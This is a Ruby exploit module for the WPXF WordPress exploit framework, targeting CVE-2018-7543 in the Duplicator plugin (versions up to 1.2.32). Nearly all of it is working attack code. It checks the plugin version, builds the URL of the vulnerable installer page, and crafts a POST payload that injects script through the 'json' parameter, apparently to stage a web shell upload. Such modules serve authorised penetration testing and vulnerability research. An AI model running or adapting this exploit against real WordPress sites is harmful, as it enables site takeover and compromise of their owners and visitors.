# frozen_string_literal: true

class Wpxf::Exploit::DuplicatorCsrfXssShellUpload < Wpxf::Module
  include Wpxf::WordPress::StagedReflectedXss

  def initialize
    super

    update_info(
      name: 'Duplicator <= 1.2.32 Reflected XSS Shell Upload',
      author: [
        'Stefan Broeder', # Disclosure
        'rastating'       # WPXF module
      ],
      references: [
        ['WPVDB', '9048'],
        ['CVE', '2018-7543']
      ],
      date: 'Mar 15 2018'
    )
  end

  def check
    check_plugin_version_from_readme('duplicator', '1.2.33')
  end

  def vulnerable_url
    normalize_uri(wordpress_url_plugins, 'duplicator', 'installer', 'build', 'view.step4.php')
  end

  def initial_script
    create_basic_post_script(
      vulnerable_url,
      'json' => "'#{Wpxf::Utility::Text.rand_alpha(5)}';};#{xss_ascii_encoded_include_script};MyViewModel%3dfunction(){this.status%3d''"
    )
  end
end
